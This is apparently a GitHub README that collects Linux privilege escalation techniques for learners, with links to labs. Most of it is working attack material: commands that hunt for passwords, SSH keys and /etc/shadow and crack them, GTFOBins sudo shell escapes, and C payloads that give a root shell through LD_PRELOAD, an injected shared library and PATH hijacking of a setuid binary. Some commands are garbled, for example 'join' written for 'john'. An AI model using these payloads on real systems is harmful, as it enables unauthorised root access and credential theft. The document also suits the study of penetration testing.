# linux-privilege-escalation

a list of many resource to learn how privilege escalation in Linux system

## Contents

- [cheat sheet](#cheatsheets)
- [Lab](#lab)
- [Enumeration](#enumeration)
    * [System enumeration](#system-enumeration)
    * [User enumeration](#user-enumeration)
    * [Network enumeration](#network-enumeration) 
    * [Password hunting](#password-hunting)
    * [automated Tools](#automated-tools)
- [Looting for passwords](#looting-for-passwords)
- [SUDO](#sudo)
- [SUID](#suid)
- [Environment Variables](#environment-variable)
- [ETC](#etc)

# cheatsheets

 - [ Basic linux privilege escalation ](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 - [ Payloads all the Things ](https://github.com/swisskyrepo/PayloadsAllTheThings)
 - [ Checklist ](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)

----

# Lab

- [Linuxzoo.net](https://linuxzoo.net) - Learn Linux from the safety of your chair using a remote private linux machine with root access.
- [TryHackMe](https://tryhackme.com) - best lab and site Tutorial.

----

# Enumeration

## System enumeration

find hostname 
```
$ hostname 
```

print system information
include : 
 - kernel name 
 - kernel release
 - kernel version
 - prosessor type 
 - operating system 
 - hardware platform 
```
$ uname -a 
```

all info about cpu 
```
$ lscpu

Architecture:                    x86_64
CPU op-mode(s):                  64-bit
CPU(s):                          8
On-line CPU(s) list:             0-7
Thread(s) per core:              2
Core(s) per socket:              4
Socket(s):                       1
NUMA node(s):                    1
Vendor ID:                       GenuineIntel
CPU family:                      6
Model:                           142
Stepping:                        10
CPU MHz:                         1170.088
CPU max MHz:                     3400.0000
CPU min MHz:                     400.0000
BogoMIPS:                        3600.00
Virtualization:                  VT-x
L1d cache:                       128 KiB
L1i cache:                       128 KiB
L2 cache:                        1 MiB
L3 cache:                        6 MiB

```
List of all tasks and processes running on the system
```
$ ps aux | grep $USER

user       1496  0.0  0.1  19028 10264 ?        Ss   10:45   0:00 /lib/systemd/systemd --user
user       1500  0.0  0.0 103956  3792 ?        S    10:45   0:00 (sd-pam)
user       1519  0.0  0.1  38412 13944 ?        Ss   10:45   0:00 /usr/bin/python3 /usr/bin/powerline-daemon --foreground
user       1520  1.3  0.2 1162332 20732 ?       S<sl 10:45   3:06 /usr/bin/pulseaudio --daemonize=no --log-target=journal
user       1523  0.0  0.1 551152  8328 ?        Sl   10:45   0:00 /usr/bin/gnome-keyring-daemon --daemonize --login
user       1526  0.0  0.7 472296 63400 ?        Ssl  10:45   0:01 xfce4-session
user       1537  0.0  0.0   8212  5192 ?        Ss   10:45   0:11 /usr/bin/dbus-daemon --session --address=systemd>>>
user       1609  0.0  0.0   6032   456 ?        Ss   10:45   0:00 /usr/bin/ssh-agent /usr/bin/im-launch startxfce4
user       1627  0.0  0.0 305284  6684 ?        Ssl  10:45   0:00 /usr/libexec/at-spi-bus-launcher
user       1632  0.0  0.0   7364  4308 ?        S    10:45   0:01 /usr/bin/dbus-daemon --config-file=/usr/share/def>>>
user       1636  0.0  0.0 230208  6008 ?        Sl   10:45   0:00 /usr/lib/x86_64-linux-gnu/xfce4/xfconf/xfconfd
user       1642  0.0  0.0 162820  7644 ?        Sl   10:45   0:07 /usr/libexec/at-spi2-registryd --use-gnome-session
user       1646  0.0  0.3 245512 28632 ?        Sl   10:45   0:02 /usr/bin/xfce4-screensaver --no-daemon
user       1649  0.0  0.1 255664  8088 ?        Ssl  10:45   0:00 /usr/libexec/gvfsd
user       1654  0.0  0.0 378336  6540 ?        Sl   10:45   0:00 /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f >>>
user       1666  1.8  0.8 637676 65008 ?        Sl   10:45   4:22 xfwm4 --replace
user       1674  0.0  0.3 247236 24176 ?        Ssl  10:45   0:09 xfsettingsd
...

```

## User enumeration

print effective userid
```
$ whoami

$ id
```

list the allowed (and forbidden) commands for the invoking user on the current host
```
$ sudo -l 
```

print list of all user in the system
```
$ cat /etc/passwd 
```

keep track history of command line
```
$ history 

$ cat ~/.bash_history
``` 

## Network enumeration

 what is ipv4/6  address of system :
``` 
$ ifconfig 
$ ip a 
```

network route :
```
$ route 
$ ip route 
```

arp packet that send 
```
$ arp -a 
$ ip neigh
```

All the questions that this command can answer you : 
  - what port are open?
  - who i communicate with?
  - who is out there network ? 
  - and more
```
$ netstat -ano 
```

## password hunting

search in the all file in linux system that contin PASSWORD key:
```
$ grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null 
```

find all tools in the system that have pass key as the  file name:
```
$ locate pass  | less 
```

find id_rsa file to public and private key:
```
$ find / -name id_rsa 2> /dev/null 
```

## automated Tools 

 * [ LinPEAS - Linux Privilege Escalation Awesome Script ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 * [ LinEnum ](https://github.com/rebootuser/LinEnum)
 * [ LES -Linux Exploit Suggester ](https://github.com/mzet-/linux-exploit-suggester)
 * [ LES2 -Linux Exploit Suggester 2 ](https://github.com/jondonas/linux-exploit-suggester-2)
 * [ Linux privilege escalation check script ](https://github.com/sleventyeleven/linuxprivchecker)

---

# Looting for passwords 

## Files containing passwords

``` 
$ grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
$ find . -type -f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

File that were edited in the last 10 minutes 
```
$ find / -mmin -19 2>/dev/null | grep -Ev "^/proc"
```

in history command:
```
$ cat .bash_history | grep -i "password"
```
in memory passwords:
```
$ strings /dev/mem -n10 | grep -i PASS
```
check permision of shadow file and if you have read permision LUKY LUK so use this command and read hash password 
```
$ cat /etc/shadow 
```
We can crack the password using join the ripper :
```
$ unshadow passwd shadow > unshadowd.txt
$ join --rules --wordlist=/path/to/wordlist/file.txt unshadowed.txt
```

## ssh keys 

```
$ find / -name authorized_keys 2> /dev/null
$ find / -name id_rsa 2> /dev/null
```

search within history strings that cnotain ssh / telnet / mysql
```
$ grep ^ssh /home/*/.hist
$ grep ^telnet /home/*/.hist
$ grep ^mysql /home/*/.hist
```

# sudo 

a command to run tools with higher(root) privilege

when you execiute ``` sudo -l ``` then has return list the allowed (and forbidden) commands for the invoking user on the current host:
```
$ sudo -l
Maching Defaults entries for Amini on this host:
	env_reset, env_keep+=LD_PRELOAD
User Amini may run the following command on this host:
	(root) NOPASSWD: /usr/bin/ftp
	(root) NOPASSWD: /usr/apache2
	(root) NOPASSWD: /usr/more
```
so after this just need to go [GTFobins](https://gtfobins.github.io) and search name of command
<br>
let's search for ftp :
```
sudo ftp
!/bin/sh
```
and that is it, now run it and we have root privilege.

[note] maybe in this site some of the command that you have access, not avialble so best move in this position is
search in google. this blog also have more : [ Abusing SUDO (linux privilege Escalation) ](https://touhidshaikh.com/blog/2018/04/11/abusing-sudo-linux-privilege-escalation/0)

```
Proof of concept
$ whoami
root
```
if you not find command in Gtfobins list just need think out of the box and improve your google skill to find it.

## LD_PRELOAD

LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.[more...](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html)

1. In command prompt type: ```sudo -l```
2. From the output, notice that the ```LD_PRELOAD``` environment variable is intact.

Exploitation

1. Open a text editor and type:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
2. Save the file as x.c
3. In command prompt type:
```
$ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles 
```
4. In command prompt type:
```
$ sudo LD_PRELOAD=/tmp/x.so apache2
```
5. In command prompt type: id

# SUID

find all the file that have suid privilege 

```
$ find / -perm -u=s -type f 2>/dev/null
$ find / -type f -perm -04000 ls 2>/dev/null
```

after find your command that have SUID go to [Gtfobins](https://gtfobins.github.io) and search about
if you are lucky find and done 

for example my SUID set command is ```systemctl``` so read gtfobins blog and find this :
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```
so line by line execiute in the command line and done, we got that.

## sub tools

sometime is not Enough to find a file that have SUID set and we need more thing like what library or sub tools the command  is using
for this purpose. so we need executing this :
```
strace <name file that have SUID set> 2>&1 | grep -i -E "open|access|no such file"
```
when you find that what library or sub tools is use , just need to write a C code and compiled after that replaced so when program with suid is run be also executed this library that we write be .

```
// C program 
#include <stdlib.h>
#include <stdio.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

```
save this and compile it with :
```
gcc -shared -fPIC -o <repleaced file path that find> <path to program file>
```
and that's it, you have root access 

also, I suggest you see [ CVE-2016-1247 ](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html) nginexed bug

## Environment Variable 

when you find some command that has suid and with ```strace ``` can't find anything after trying to find what command that executed with :
```
string /path/to/example
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
service apache2 start 
```
here we find a service command that executed after run ```example```  and we know that have suid bit so what happens if we create a tool with  ```service``` name and replaced with, let's see it :)

```
// new service command to replase with environment variable 
int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```
and compile it
```
gcc /tmp/service.c -o /tmp/service 
```
so after that just need to change the PATH variable and run example command 
```
$ export PATH=/tmp:$PATH
$ /path/to/example/command
```
if you not see any error so that's mean successfully done

# THIS LIST ٌWILL BE UPDATED 

# ETC


-
-
-
